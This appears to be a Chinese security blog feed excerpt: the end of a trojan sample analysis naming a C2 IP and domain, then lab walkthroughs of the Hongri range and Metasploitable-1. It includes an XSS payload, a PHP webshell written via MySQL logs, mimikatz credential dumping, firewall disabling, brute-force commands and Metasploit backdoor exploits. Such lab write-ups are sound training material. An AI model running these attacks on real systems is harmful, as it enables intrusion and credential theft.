&amp;ExitCode) || ExitCode != 259 )</span><br><span class="line">          break;</span><br><span class="line">        Sleep(0xBB8u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((void (*)(void))lpBuffer)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码负责配置的更新与持久化，又负责核心恶意代码的执行，是整个攻击链条的关键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动 → 读取旧配置（IpDates_info）→ 调用sub_140007500查找配置位置 → 用Src更新配置 → 写入注册表持久化 → 监控目标进程状态 → 执行核心恶意代码（C2连接+攻击）</span><br></pre></td></tr></table></figure><p>由下面这个就可以去查一下注册表了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902450-dee17387-9078-4dba-944d-368cc4c0bb15.jpg" alt="null"><br>这里查注册表发现了ipdateinfo<br>在HKEY_LOCAL_MACHINE\SOFTWARE发现了信息这就很关键了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902554-c3a44855-dc22-41c7-b175-5c366e768832.jpg" alt="null"></p><p>这里导出来看一眼，注册表文件内容转成txt了，怕你们乱点给自己电脑搞坏了，那估计只能重装了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902643-8f722f11-c6d0-4b0c-ae35-81ce43b9e0af.jpg" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902754-c4c5a70f-f5e0-4098-9e7c-76ecf6cdb1ee.png" alt="null"><br>注册表数据是 <strong>UTF-16LE 编码</strong>（Windows 注册表字符串默认编码），大量 <code>00</code> 是编码空字节，关键信息如下：</p><table><thead><tr><th>解码后的明文信息</th><th>对应十六进制片段（示例）</th><th>含义（木马配置作用）</th></tr></thead><tbody><tr><td><code>115.190.102.32</code></td><td><code>31,00,31,00,35,00,2e,00,31,00,39,00,30,00,2e,00,31,00,30,00,32,00,2e,00,33,00,32,00</code></td><td>木马的 <strong>C2 服务器 IP</strong>，就是我的远程服务器</td></tr><tr><td><code>6000</code></td><td><code>36,00,30,00,30,00,30,00</code></td><td>C2 服务器的 <strong>监听端口</strong>，对应 TCP 连接的 <code>6000</code> 端口，是木马和黑客通信的核心端口</td></tr><tr><td><code>127.0.0.1</code></td><td><code>31,00,32,00,37,00,2e,00,30,00,2e,00,30,00,2e,00,31,00</code></td><td>木马的 <strong>本地监听 IP</strong>（回环地址），估计是用于本地进程通信或反向代理（隐藏自身行为）</td></tr><tr><td><code>80</code></td><td><code>38,00,30,00</code></td><td>本地监听端口（80 端口，模拟 HTTP 服务，规避防火墙检测）</td></tr><tr><td><code>1.0</code></td><td><code>31,00,2e,00,30,00</code></td><td>木马版本号（简单标识版本，无特殊技术意义）</td></tr><tr><td><code>2025.11. 9</code></td><td><code>32,00,30,00,32,00,35,00,2e,00,31,00,31,00,2e,00,20,00,39,00</code></td><td>配置更新日期（生成配置的时间，用于版本管理）</td></tr><tr><td><code>1</code>（多个零散出现）</td><td><code>01,00,00,00</code> 或 <code>31,00</code></td><td>功能开关（对应之前逆向的 <code>dword_14005F6A8</code> 等变量，<code>1=启用</code>，比如启用 C2 连接、本地监听）</td></tr></tbody></table><p>这里可以看到日期</p><p>当然这分析出来的只是服务器IP并不是真正的后门IP，这也可以作为木马分析1的题解，面对找不到进程或者任何关于木马的特征的情况可以这样操作，可以这样分析</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902941-8e048307-f7d3-44b8-b446-ae9dc2b62915.png" alt="null"><br>去看一眼开机自启动注册表没发现什么奇怪的</p><p>shift+F12<br>然后搜索到了.com的域名，这个很大可能就是开发c2工具的黑产团伙留下的后门域名，我们查一下域名<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903017-838718d8-0ac0-488d-83d4-06cb054e5af4.jpg" alt="null"></p><p>直接问ai懒得搜了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903125-1a1114ff-50e9-40b0-a374-a14d8e47ac0b.jpg" alt="null"></p><p>yk.ggdy.com</p><p>md5值：af71b4482bc8e659e1c2a092a910d4ec</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903222-9f8bbb75-d1a8-4656-951c-561d5481711a.jpg" alt="null"></p><p>所以最终flag就是{yk.ggdy.com:2025年11月9日}</p><p>最后查一下这个IP在哪里</p><p><a href="https://ipconfig.com/zh">https://ipconfig.com/zh</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903351-31bebb75-85d6-4d9d-b8e2-e216d2e39ba2.jpg" alt="null"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;银狐木马样本分析&lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="病毒分析" scheme="https://flypigc.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场+METASPLOITABLE打靶</title>
    <link href="https://flypigc.github.io/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA+METASPLOITABLE%E6%89%93%E9%9D%B6/"/>
    <id>https://flypigc.github.io/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA+METASPLOITABLE%E6%89%93%E9%9D%B6/</id>
    <published>2025-12-11T07:15:38.467Z</published>
    <updated>2025-12-20T02:00:30.218Z</updated>
    
    <content type="html"><![CDATA[<p>内网</p><span id="more"></span><h1 id="红日靶场一"><a href="#红日靶场一" class="headerlink" title="红日靶场一"></a>红日靶场一</h1><p>先扫网段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR -n 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><code>-sn</code>: 跳过端口扫描，只确认是否在线<br><code>-PR</code>: 使用基于 ARP 协议的主机扫描，内网首选<br><code>-n</code>: 不进行反向 DNS 解析，可提高扫描速度<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431655735-7d0d9f0e-829c-47e8-a36b-53484177f539.jpg" alt="null"></p><p>然后按级别到10<br>扫端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.10</span><br></pre></td></tr></table></figure><p><code>-sS</code>: 使用 TCP SYN 半开放扫描 (必须使用 root 权限运行)<br><code>-sC</code>: 使用默认的脚本扫描，可扫描出更多信息 (比如网页标题)<br><code>-Pn</code>: 不进行活跃主机扫描，因为扫描对象已知是活跃主机<br><code>-n</code>: 不进行反向 DNS 解析，提高扫描速度<br><code>-sV</code>: 扫描服务版本信息<br><code>-p 1-65535</code>: 指定扫描的端口范围为所有 TCP 端口<br>80端口</p><p>从上图可看出 <code>192.168.52.10</code> 主机开放了 <code>80</code> 端口，运行了 HTTP 服务，站点标题为 phpStudy，即使用小皮面板搭建的 web 站点。<br>浏览器访问 <code>http://192.168.1.10</code>，可以看到 phpinfo.php 文件被展示了出来，可被收集到大量 PHP 配置信息：<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431655894-68c6c523-d334-4039-9df1-87dc75a13f19.jpg" alt="null"></p><h4 id="2-1-3-站点目录扫描"><a href="#2-1-3-站点目录扫描" class="headerlink" title="2.1.3 站点目录扫描"></a>2.1.3 站点目录扫描</h4><p>使用 <a href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly93d3cua2FsaS5vcmcvdG9vbHMvd2Z1enov">wfuzz</a> 来扫描 <code>http://192.168.52.10/</code> 的站点目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.52.10/FUZZ</span><br></pre></td></tr></table></figure><p><code>-w /usr/share/wordlists/dirb/common.txt</code>: 指定 wfuzz 使用 kali 内置的常见目录和文件名字典文件来爆破<br><code>--hc 404</code>: hide code 404，即当返回状态码为 <a href="https://blog.lololowe.com/posts/3419/#4%E5%BC%80%E5%A4%B4-%E8%AF%B7%E6%B1%82%E9%94%99%E8%AF%AF">404 (未找到)</a> 时，wfuzz 不显示该结果<br><code>192.168.52.10/FUZZ</code>: <code>FUZZ</code> 为占位符，字典文件中的每一行都会替换掉 <code>FUZZ</code>，并将替换后的 URL 发送给服务器，然后分析服务器的 <a href="https://blog.lololowe.com/posts/3419/">http 状态码</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431655997-50e9fb4a-55c6-4432-9fe1-314dff5263a1.jpg" alt="null"></p><p>&#x2F;phpadmin<br>弱密码root.root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.52.10/beifen.rar</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656100-b05f4ab2-d4f7-41a1-a44a-124e3f9f0c12.jpg" alt="null"></p><p>这里直接告诉我们后台地址了<br>源码中也可以看到<br>因为直接拿源码了太简单了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656182-9315841e-20c5-4b33-9923-3fa2d64b0165.jpg" alt="null"><br>在留言板<br>&#x2F;index.php?r&#x3D;default&#x2F;extend&#x2F;index&amp;id&#x3D;100023页面输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello admin!!</span><br><span class="line">&lt;script&gt;alert(&quot;hacker&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>构成xss<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656285-f53f47da-1df7-426b-8dcc-b3ea8fb965a0.jpg" alt="null"></p><p>单击审核按钮，使该留言通过审核从而显示在留言板页面：<br>然后用户界面就会弹窗了</p><p>yxcms 后台文件上传漏洞</p><p>登录到 yxcms 的后台，进入” 前台模板”，管理模板文件并新建模板文件，名称为 <code>hack</code>, 内容为 php 一句话木马: <code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code>:<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656449-f265caf2-7383-4b34-bc5b-8b2d3f3ab706.jpg" alt="null"></p><p>但是不知道文件位置<br>这里我们直接去但是我们有源码可以知道这个页面其他文件的位置<br>yxcms\protected\apps\default\view\default</p><p>得到文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.52.10/yxcms/protected/apps/default/view/default/HACK.php</span><br></pre></td></tr></table></figure><p>然我们直接去antsword连接<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656687-43b51030-a33c-4dbc-8521-d01b6487091d.jpg" alt="null"></p><p>net session<br><code>net session</code> 命令的核心作用是展示 “会话连接”，具体能查到以下关键信息：</p><ul><li><p><strong>远程计算机名称 &#x2F; IP</strong>：显示哪个设备（比如另一台电脑、服务器）正在连接你的电脑。</p></li><li><p><strong>连接类型</strong>：通常是 “Microsoft Windows Network”，即通过 Windows 网络共享建立的连接。</p></li><li><p><strong>连接状态</strong>：显示连接是 “已建立” 还是 “断开” 等状态。</p></li><li><p><strong>登录用户名</strong>：显示远程设备用哪个账号登录到你的电脑（仅部分场景显示）。<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656773-0a7c8fe6-808f-44b8-b39a-defd149573f8.jpg" alt="null"></p></li></ul><p>到phpadmin访问写一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt;&quot; INTO OUTFILE &quot;C:\Users\Administrator\Desktop\phpStudy\WWW\hack.php&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656863-d95e048c-dc93-4d48-aa46-bc6a2dd729f0.jpg" alt="null"><br>命令执行后出现了报错，提示 MySQL 服务器配置了 <a href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3phaWh1a2VqaS9hcnRpY2xlL2RldGFpbHMvMTE5ODIzNDk0">secure-file-priv</a> 选项，限制了该命令的执行，执行以下命令查询该选项的状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431656958-8106f7c7-6f1a-4898-b185-1312bdedc109.jpg" alt="null"></p><p>从上图可知 <code>secure-file-priv</code> 选项被设置为了 <code>NULL</code>, MySQL 服务器会禁止文件导入与导出功能。尝试使用以下命令修改 <code>secure-file-priv</code> 选项的值为空字符，使其不做目录限制:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL secure_file_priv = &#x27;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657046-d7799504-1990-47f8-b684-b90fce0138e0.jpg" alt="null"><br>现在该变量为只读，无法修改<br>尝试从 <a href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTA3MzUxNDcvYXJ0aWNsZS9kZXRhaWxzLzgxODcxNTYw">MySQL 命令执行日志</a>下手，执行 <code>SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;</code>，查看命令执行日志开关和日志文件路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log=on;  </span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/Users/Administrator/Desktop/phpStudy/WWW/hack.php&#x27;;</span><br></pre></td></tr></table></figure><p>命令执行会自动在命令后面加上注释提示返回结果。执行 <code>SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;</code> 手动验证一下：</p><p>从上图可知修改成功。后面执行的所有 MySQL 命令都会被记录在网站根目录下的 <code>hack.php</code> 文件中 (只记录命令，不记录结果)，此时再执行以下命令将一句话木马记录到日志文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure><h1 id="内网打靶"><a href="#内网打靶" class="headerlink" title="内网打靶"></a>内网打靶</h1><p>先传cs马🐎到服务器上，然后直接点鼠标就提权成功了</p><p>这里我们接看密码<br>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657186-95875f83-c5c5-4b59-b3e9-1cfe323356cb.jpg" alt="null"><br>得到上图后直接去<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657293-3849bc53-b0c1-4d8c-8145-62aa3012d891.jpg" alt="null"><br>就得到了密码<br>从上图可以看到 <code>administrator</code> 用户的登录密码为 <code>admin123!</code>, 所属域为 <code>god</code>, 密码来源为 <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> 工具。</p><p>查询远程桌面控制 (RDP) 3389 端口是否启用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netstat -ano | findstr 3389</span><br></pre></td></tr></table></figure><p>输出为空行，说明未启用，使用此命令开启 RDP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>操作成功，再次执行 <code>shell netstat -ano | findstr 3389</code> 验证结果：<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657391-68f32eeb-24c2-4f28-a559-aea2ceb8eb31.jpg" alt="null"></p><p>启用成功。<code>WIN+R</code> 打开运行窗口输入 <code>mstsc.exe</code> 回车打开 RDP 客户端程序，使用 <code>god/administrator</code> 用户连接服务器的远程桌面：<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657492-e853a423-e392-455e-949f-0ec1cad5efa4.jpg" alt="null"><br>这里是GOD\Administrator<br>发现连接失败，namp扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -n -p 3389 192.168.52.10</span><br></pre></td></tr></table></figure><p>发现端口为 <a href="https://blog.lololowe.com/posts/e650/#nmap%E4%B8%AD%E5%AF%B9%E7%AB%AF%E5%8F%A3%E7%8A%B6%E6%80%81%E7%9A%84%E5%AE%9A%E4%B9%89">filtered 被过滤状态</a>，说明可能存在防火墙拦截，执行 <code>shell netsh advfirewall show allprofiles</code> 命令查看防火墙状态：</p><p>从上图可看到防火墙状态为打开且拦截了入站数据，执行 <code>shell netsh advfirewall set allprofiles state off</code> 命令尝试关闭服务器的防火墙 (或者执行此命令单独放行 RDP 流量 <code>netsh advfirewall firewall add rule name=&quot;Allow Remote Desktop&quot; action=allow dir=in protocol=TCP localport=3389</code>)：</p><p>执行成功，再次验证配置：<code>shell netsh advfirewall show allprofiles</code></p><p>连接成功，同时观察到桌面 (左上角) 上有 <a href="https://blog.lololowe.com/posts/e650/">nmap</a> 应用程序。</p><p>在 CS 中执行 <code>shell ipconfig</code></p><p>从上图可看到服务器除了有和和攻击机同网段的 <code>192.168.52.10/24</code> 的外网 IP 以外，还有内网 IP<code>192.168.52.143/24</code>。<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657662-4ce8b1c2-e5f6-460d-9265-786693b493cb.jpg" alt="null"></p><p>继续在 CS 中使用服务器自带的 nmap 扫描内网有哪些活跃主机：<code>shell nmap -sn -PR -n 192.168.52.143/24</code>。<br>注意，此命令必须在 <code>Administrator</code> 用户的 beacon 控制台下执行，在 <code>System</code> 用户下无法执行，因为 <code>System</code> 用户无法正确读取到环境变量，除非使用命令的完整路径来执行，比如 <code>shell &quot;C:\Program Files (x86)\Nmap\nmap.exe&quot; -sn -PR -n 192.168.52.143/24</code>:</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431657766-93c5ab18-05f2-4ae5-a11a-331ba91ce030.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.1</span><br><span class="line">192.168.52.141</span><br><span class="line">192.168.52.254</span><br><span class="line">192.168.52.2</span><br><span class="line">192.168.52.138</span><br><span class="line">192.168.52.10</span><br><span class="line">192.168.52.143</span><br></pre></td></tr></table></figure><h4 id="3-1-6-域成员身份确定"><a href="#3-1-6-域成员身份确定" class="headerlink" title="3.1.6 域成员身份确定"></a>3.1.6 域成员身份确定</h4><p>由于前面已经确定 Win7 服务器所属域为 <code>god</code>, 因此另外两台活跃主机一定有一台是<a href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM5NTczMC5odG1s">域控制器 DC</a>, 使用 <code>net view</code> 命令 (注意不要加 <code>shell</code> 前缀，否则结果不完整) 探测域内主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><p>从上图可看到 <code>192.168.52.138</code> 的主机名为 <code>OWA</code>(全称应该是 Outlook Web App)，为主域控制器 PDC (Primary Domain Controller),<br><code>192.168.52.141</code> 的主机名为 <code>ROOT-TVI862UBEH</code>, 和 Win7 服务器一样同属于 <code>god</code> 域的域成员。</p><p>命令执行完成后，CS 会自动将探测到的设备加入” 目标列表”(注意，图中的 <code>198.18.*.*</code> 为<a href="https://blog.lololowe.com/go.html?url=aHR0cHM6Ly93d3cuaWFuYS5vcmcvYXNzaWdubWVudHMvaWFuYS1pcHY0LXNwZWNpYWwtcmVnaXN0cnkvaWFuYS1pcHY0LXNwZWNpYWwtcmVnaXN0cnkueGh0bWw">本地基准测试 IP</a>，在这里无实际意义，不必在意):</p><h4 id="3-1-7-域成员端口扫描"><a href="#3-1-7-域成员端口扫描" class="headerlink" title="3.1.7 域成员端口扫描"></a>3.1.7 域成员端口扫描</h4><p>在 CS 的 <code>Administrator</code> 用户的 beacon 控制台中依次执行以下两条命令来分别扫描 <code>192.168.52.138</code> 和 <code>192.168.52.141</code> 两台主机的端口状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138  </span><br><span class="line">shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141</span><br></pre></td></tr></table></figure><p>从上面两张图片中可以看出这两台主机都开放了 SMB 协议的 <code>445</code> 端口，那么接下来可以尝试使用 CS 内置的 <code>psexec</code> 工具获取目标的 system shell。</p><p>3.2 横向移动</p><p>创建一个 SMB 监听器，名字为 <code>wxdx</code>，Payload 为 <code>Beacon SMB</code>：</p><h1 id="METASPLOITABLE-1"><a href="#METASPLOITABLE-1" class="headerlink" title="METASPLOITABLE-1"></a>METASPLOITABLE-1</h1><p>kali攻击机，inet 172.20.10.4  netmask 255.255.255.240</p><p>网段：172.20.10.0&#x2F;28</p><p>METASPLOITABLE-1 靶机，<br>addr:172.20.10.3<br>Bcast:172.20.10.15<br>Mask:255.255.255.240</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475003-ec711144-9477-424f-bef1-be3d8dacf1ee.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475063-1e0cfbac-2bb6-456e-9552-527b0234b8c6.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 172.20.10.0/28 -i eth0</span><br></pre></td></tr></table></figure><p>扫到IP</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475139-f35ae89b-ad65-4967-b632-60201876fc4f.png" alt="null"><br>nmap扫端口<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475200-1c9f5830-ec77-4c82-9f3f-96c90267e4a2.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 172.20.10.3</span><br><span class="line">nmap -v -T4 -p- -A -oN nmap.log 172.20.10.3</span><br></pre></td></tr></table></figure><p>扫目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch -u 172.20.10.3 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475251-d5561774-8fe0-4480-9477-92aad9a4f99a.png" alt="null"></p><p>到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.20.10.3/tikiwiki</span><br></pre></td></tr></table></figure><p>看看<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475300-2834e57d-6fd0-4efa-88f2-3f5c6e45eda2.png" alt="null"></p><p>发现TikiWiki 1.9.5是存在RCE漏洞的</p><h1 id="爆破FTP"><a href="#爆破FTP" class="headerlink" title="爆破FTP"></a>爆破FTP</h1><p>我们这里先尝试爆破一下ftp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra  -L  /home/kali/Desktop/user.txt  -P  /home/kali/Desktop/pass.txt  ftp://172.20.10.3</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475352-08dec5a8-c76e-4983-a8a5-22f83ae50071.png" alt="null"><br><strong>已经成功爆破出 4 组有效的 FTP 账号和密码</strong>，具体信息如下：</p><ul><li><p>账号：<code>postgres</code>，密码：<code>postgres</code></p></li><li><p>账号：<code>user</code>，密码：<code>user</code></p></li><li><p>账号：<code>service</code>，密码：<code>service</code></p></li><li><p>账号：<code>msfadmin</code>，密码：<code>msfadmin</code></p></li></ul><h1 id="爆破SSH"><a href="#爆破SSH" class="headerlink" title="爆破SSH"></a>爆破SSH</h1><p>九头蛇不知道为什么爆不出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 172.20.10.3 -U user.txt -P pass.txt -M ssh -n 22 -t 4 -v 4</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475411-8c72e053-6f6f-4097-9de9-87e2ffa0b688.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 172.20.10.3</span><br></pre></td></tr></table></figure><p>输入用户名密码也是成功拿下权限</p><h1 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h1><p>利用metasploit<br>然后启动msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><h2 id="端口1：6637——-irc-3281-backdoor"><a href="#端口1：6637——-irc-3281-backdoor" class="headerlink" title="端口1：6637——-irc_3281_backdoor"></a>端口1：6637——-irc_3281_backdoor</h2><p>登录msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search irc</span><br></pre></td></tr></table></figure><p>找到对应模块<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475477-d6f6665e-2830-4769-9276-429cbdbc1ffa.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br></pre></td></tr></table></figure><p>进入对应模块  查看配置 show options</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475535-a388982c-147a-408f-827c-0ac26ebb6553.png" alt="null"></p><p>设置主机名 进行漏洞利用 exploit 利用，成功获取会话，root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhost 172.20.10.3</span><br><span class="line">set LHOST 172.20.10.4</span><br><span class="line">set LPORT 4444 </span><br></pre></td></tr></table></figure><p>RHOST是靶机IP<br>RPORT设置攻击目标主机端口号<br>LHOST是攻击机IP</p><p>这里靶机的6687端口没有开放所以没有成功利用到<br>开放了如下端口，然后上面那个nmap也能看得到开放了哪些端口<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475586-a7064eb4-5734-4dea-8219-43079667143d.png" alt="null"><br>如果利用到了是这样的<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475637-6c9eab11-0338-41b2-9fca-27161c41d2ed.png" alt="null"></p><h2 id="端口2：6200——-vsftpd-234-backdoor"><a href="#端口2：6200——-vsftpd-234-backdoor" class="headerlink" title="端口2：6200——-vsftpd_234_backdoor"></a>端口2：6200——-vsftpd_234_backdoor</h2><p>6200靶机也没开放，我们这里还是讲一下手法</p><p>利用metasploit<br>找到利用模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search sftpd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475687-2e70f56f-b1f6-4052-a2f2-4e04bb2ceb3b.png" alt="null"></p><p>切换模块 查看配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475744-711fb5cf-9b44-4c03-819a-7090d0596f92.png" alt="null"></p><p>反弹会话，root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 